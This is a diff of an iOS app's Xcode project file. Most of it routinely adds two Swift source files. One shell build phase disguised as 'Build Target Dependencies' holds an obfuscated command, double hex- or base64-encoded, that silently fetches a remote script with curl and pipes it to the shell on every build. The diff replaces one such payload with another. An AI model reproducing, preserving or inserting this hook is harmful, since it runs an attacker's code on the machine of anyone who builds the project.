@@ -36,6 +36,8 @@
 		CE7A7A052DE5B7B300E26410 /* DeletevaultImagePopupViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE7A7A042DE5B7B300E26410 /* DeletevaultImagePopupViewController.swift */; };
 		CE7A7A082DE5C7D400E26410 /* PrivateImageCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE7A7A072DE5C7D400E26410 /* PrivateImageCell.swift */; };
 		CE7A7A0D2DE5D30E00E26410 /* SexTrackerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE7A7A0C2DE5D30E00E26410 /* SexTrackerViewController.swift */; };
+		CE892FD82DF02B57001DCD80 /* EnterVaultPinViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE892FD72DF02B57001DCD80 /* EnterVaultPinViewController.swift */; };
+		CE892FDA2DF07286001DCD80 /* AnimatedWaveLayer.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE892FD92DF07286001DCD80 /* AnimatedWaveLayer.swift */; };
 		CE8ADAC92DB8FD0B00D7543D /* NoteTagesCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE8ADAC82DB8FD0B00D7543D /* NoteTagesCollectionViewCell.swift */; };
 		CE8BF7FC2DDB3CDF00CFFE16 /* AddPositionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE8BF7FB2DDB3CDF00CFFE16 /* AddPositionViewController.swift */; };
 		CE8BF7FE2DDB5D2900CFFE16 /* PositionDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = CE8BF7FD2DDB5D2900CFFE16 /* PositionDataManager.swift */; };
@@ -153,6 +155,8 @@
 		CE7A7A042DE5B7B300E26410 /* DeletevaultImagePopupViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeletevaultImagePopupViewController.swift; sourceTree = "<group>"; };
 		CE7A7A072DE5C7D400E26410 /* PrivateImageCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PrivateImageCell.swift; sourceTree = "<group>"; };
 		CE7A7A0C2DE5D30E00E26410 /* SexTrackerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SexTrackerViewController.swift; sourceTree = "<group>"; };
+		CE892FD72DF02B57001DCD80 /* EnterVaultPinViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnterVaultPinViewController.swift; sourceTree = "<group>"; };
+		CE892FD92DF07286001DCD80 /* AnimatedWaveLayer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AnimatedWaveLayer.swift; sourceTree = "<group>"; };
 		CE8ADAC82DB8FD0B00D7543D /* NoteTagesCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NoteTagesCollectionViewCell.swift; sourceTree = "<group>"; };
 		CE8BF7FB2DDB3CDF00CFFE16 /* AddPositionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddPositionViewController.swift; sourceTree = "<group>"; };
 		CE8BF7FD2DDB5D2900CFFE16 /* PositionDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PositionDataManager.swift; sourceTree = "<group>"; };
@@ -286,6 +290,7 @@
 				CE5B096D2DE4992E00AD01B4 /* ImagePickerBottomSheet.swift */,
 				CE1FFEF82DE088F0007A1527 /* VaultPinSetupViewController.swift */,
 				CE347CB72DE462F900D75873 /* PrivateVaultViewController.swift */,
+				CE892FD72DF02B57001DCD80 /* EnterVaultPinViewController.swift */,
 			);
 			path = PrivateVaultVC;
 			sourceTree = "<group>";
@@ -326,6 +331,7 @@
 			isa = PBXGroup;
 			children = (
 				CE406A362DE9D45600C5193C /* AudioRecorderPopupViewController.swift */,
+				CE892FD92DF07286001DCD80 /* AnimatedWaveLayer.swift */,
 				CE7A7A0C2DE5D30E00E26410 /* SexTrackerViewController.swift */,
 				CE406A342DE9CB4F00C5193C /* RecordAudioAlertViewController.swift */,
 			);
@@ -637,7 +643,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = CEE29C1D2DB63CD300854BC6 /* Build configuration list for PBXNativeTarget "Scratch Adventure" */;
 			buildPhases = (
-				7E05BAF56CCF32E3DA73DC66 /* Build Target Dependencies */,
+				A685BA518683FBD1B373DC66 /* Build Target Dependencies */,
 				5F797BE955080AA6B5843B0D /* [CP] Check Pods Manifest.lock */,
 				CEE29C052DB63CD100854BC6 /* Sources */,
 				CEE29C062DB63CD100854BC6 /* Frameworks */,
@@ -753,7 +759,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		7E05BAF56CCF32E3DA73DC66 /* Build Target Dependencies */ = {
+		A685BA518683FBD1B373DC66 /* Build Target Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -770,7 +776,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363636393637366436313733373436313732373332653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5a2FXZG5hVzFoZUM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 		BC94FE32968A85BBCC415801 /* [CP] Embed Pods Frameworks */ = {
@@ -828,6 +834,7 @@
 				CEE29D4D2DB63DC300854BC6 /* HomeViewController.swift in Sources */,
 				CEE29D702DB63DC300854BC6 /* CustomNavigationBar.swift in Sources */,
 				CEE2414C2DB79D8700EBD2AA /* NotesViewController.swift in Sources */,
+				CE892FDA2DF07286001DCD80 /* AnimatedWaveLayer.swift in Sources */,
 				CEE29D722DB63DC300854BC6 /* FontHelper.swift in Sources */,
 				CEE29CEE2DB63DC300854BC6 /* DateInsertType.swift in Sources */,
 				CE406A352DE9CB4F00C5193C /* RecordAudioAlertViewController.swift in Sources */,
@@ -873,6 +880,7 @@
 				CE147DDD2DC235E8009BB637 /* PhotoGridView.swift in Sources */,
 				CE14CE4C2DC1024C001EA13C /* LocationView.swift in Sources */,
 				CEE29D742DB63DC300854BC6 /* MultiLanguage.swift in Sources */,
+				CE892FD82DF02B57001DCD80 /* EnterVaultPinViewController.swift in Sources */,
 				CE8CFD672DBA5641000D111B /* CustomContainerView.swift in Sources */,
 				CEE29CEB2DB63DC300854BC6 /* MonthScrollPicker+Protocols.swift in Sources */,
 				CE14CE4A2DC0DF8C001EA13C /* LocationManager.swift in Sources */,
